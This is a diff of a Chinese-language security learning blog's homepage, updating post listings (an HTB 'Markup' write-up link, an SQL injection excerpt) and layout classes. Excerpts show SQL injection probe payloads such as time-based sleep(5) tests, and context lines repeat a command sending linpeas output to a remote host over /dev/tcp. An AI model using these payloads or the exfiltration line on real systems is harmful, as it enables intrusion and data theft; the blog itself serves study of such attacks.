@@ -46,9 +46,9 @@
   />
   <meta property="og:image" content="https://test692618.github.io/images/banner.webp" />
   <meta property="article:author" content="L" />
-  <meta property="article:published_time" content="2026-03-29T00:00:00&#43;00:00" />
-  <meta property="article:modified_time" content="2026-03-29T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" /><link rel="alternate" type="application/rss+xml" href="https://test692618.github.io/index.xml" title="HELLO WORLD">
-<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.3cb430561af988141327a9e105860d0e1d0f240a915b0c600564590371ef51c3.css" /><link
+  <meta property="article:published_time" content="2026-04-01T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2026-04-01T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" /><link rel="alternate" type="application/rss+xml" href="https://test692618.github.io/index.xml" title="HELLO WORLD">
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.abc397b347f937380734b44bf4d20f195146ec63edf7d6b881124b192e152126.css" /><link
     rel="preload"
     as="style"
     href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
@@ -195,7 +195,7 @@
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">80</div>
+    <div>文章</div><div class="sidebar-state-number">81</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>分类</div>
@@ -518,6 +518,8 @@
       <h3 class="widget-title">最新文章</h3>
       <div class="widget">
         <ul><li>
+              <a href="/post/htb/htb%E6%89%93%E9%9D%B6-markup/" title="htb-Markup">htb-Markup</a>
+            </li><li>
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-included/" title="htb-Included">htb-Included</a>
             </li><li>
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-unified/" title="htb-Unified">htb-Unified</a>
@@ -525,8 +527,6 @@
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-oopsie/" title="htb-Oopsie">htb-Oopsie</a>
             </li><li>
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-archetype/" title="htb-Archetype">htb-Archetype</a>
-            </li><li>
-              <a href="/post/htb/htb-trick/" title="htb-trick">htb-trick</a>
             </li></ul>
       </div>
     </div>
@@ -539,13 +539,55 @@
     data-aos="fade-up"
   ><a
         class="post-link"
+        href="/post/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/sql%E6%B3%A8%E5%85%A5/"
+        aria-label="SQL注入"
+        title="SQL注入"
+      >
+      </a><div
+      class="
+        post-cover left
+      "
+    ><img
+            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-sizes="auto"
+            alt="SQL注入"
+            class="lazyload"
+          /></div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span
+          ><span class="icon-calendar"></span
+          >2024-01-29</span
+        ><span
+          ><span class="icon-pencil"></span
+          >3654 字</span
+        >
+        <span
+          ><span class="icon-clock"></span
+          >8 分钟</span
+        >
+      </div>
+      <h2 class="post-title">SQL注入</h2>
+      <article class="post-article"> 概述 SQL注入漏洞的本质就是通过恶意字符的拼接，导致sql语句产生歧义，凡是与数据库交互的地方都有可能存在sql注入点。
+判断和利用思路 判断 根据页面响应情况判断 Xxx.com/sqli/?id=1 能正常显示。 Xxx.com/sqli/?id=1‘ and 1=1 # 也能正常显示。 Xxx.com/sqli/?id=1’ and 1=2 # 不能正常显示页面。 根据页面响应时间判断 Xxx.com/sqli/?id=1’ and sleep（5） 内容5秒后才出现页面。 根据页面报错信息判断 Xxx.com/sqli/?id=1‘ 故意拼接错误的sql语句，看是否会在页面产生数据 …</article>
+    </div>
+  </div>
+</div>
+<div class="post-wrapper">
+  <div
+    class="
+      post-wrap right
+    "
+    data-aos="fade-up"
+  ><a
+        class="post-link"
         href="/post/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/tomcat-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938-/"
         aria-label="Tomcat 文件读取包含漏洞 (cve-2020-1938)"
         title="Tomcat 文件读取包含漏洞 (cve-2020-1938)"
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -577,7 +619,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -588,7 +630,7 @@
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -618,7 +660,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -629,7 +671,7 @@
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -662,7 +704,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -673,7 +715,7 @@
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -708,7 +750,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -719,7 +761,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -752,7 +794,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -763,7 +805,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -793,7 +835,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -804,7 +846,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -837,7 +879,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -848,7 +890,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -880,7 +922,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -891,7 +933,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -915,51 +957,6 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       </div>
       <h2 class="post-title">CDN绕过</h2>
       <article class="post-article"> CDN 配置方式 1.针对单个域名进行CDN配置， 由于子域名可能会部署在一个服务器上，此时可通过子域名获取真实IP www.xx.com 配置了CDN加速 oa.xxx.com 未配置CDN加速 当然也有可能 *.xxx.com的方式 进行配置了CDN。 2.针对区域加速，仅对国内访问进行了CDN加速，此时可通过用国外IP访问的方式获取真实IP。 3.Z针对资源进行加速。 判定CDN 全球ping 获取真实IP方法 利用ssrf漏洞：若站点存在SSRF漏洞，可构造payload，访问自建的网站，通过自建网站的访问日志即可发现网站真实IP。 站点信息泄露：存在phpinfo等其他类似的内容。 …</article>
-    </div>
-  </div>
-</div>
-<div class="post-wrapper">
-  <div
-    class="
-      post-wrap right
-    "
-    data-aos="fade-up"
-  ><a
-        class="post-link"
-        href="/post/%E6%9D%82%E9%A1%B9/%E7%BC%96%E7%A0%81/"
-        aria-label="编码"
-        title="编码"
-      >
-      </a><div
-      class="
-        post-cover right
-      "
-    ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
-            data-sizes="auto"
-            alt="编码"
-            class="lazyload"
-          /></div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span
-          ><span class="icon-calendar"></span
-          >2024-01-28</span
-        ><span
-          ><span class="icon-pencil"></span
-          >272 字</span
-        >
-        <span
-          ><span class="icon-clock"></span
-          >1 分钟</span
-        >
-      </div>
-      <h2 class="post-title">编码</h2>
-      <article class="post-article">编码不等同于加密，编码只是换一种表达方式，相当于汉语转成英语。
-Url编码：%E7%90%85%E9%9F%B3
-特征是百分号：%
-Html编码：&amp;ltxsa: (就是实体字符)
-</article>
     </div>
   </div>
 </div>
@@ -989,10 +986,10 @@ Html编码：&amp;ltxsa: (就是实体字符)
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;78.7k</span
+          >&nbsp;79.5k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;03:20</span>
+        <span class="icon-coffee">&nbsp;03:22</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -1026,7 +1023,7 @@ Html编码：&amp;ltxsa: (就是实体字符)
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">80</div>
+    <div>文章</div><div class="sidebar-state-number">81</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>分类</div>
@@ -1115,7 +1112,17 @@ Html编码：&amp;ltxsa: (就是实体字符)
     
     
     onload="setupFirework()"
-    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script>
+    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script><script>
+  var setupLive2d = () => {
+    live2d.init('https:\/\/fastly.jsdelivr.net\/gh\/D-Sketon\/plugin-live2d\/', {themeTipsPath: ""});
+  }
+</script><script
+    src="https://test692618.github.io/"
+    
+    async
+    
+    onload="setupLive2d()"
+    ></script>
 
 <div id="lazy-script">
   <div><script data-pjax>
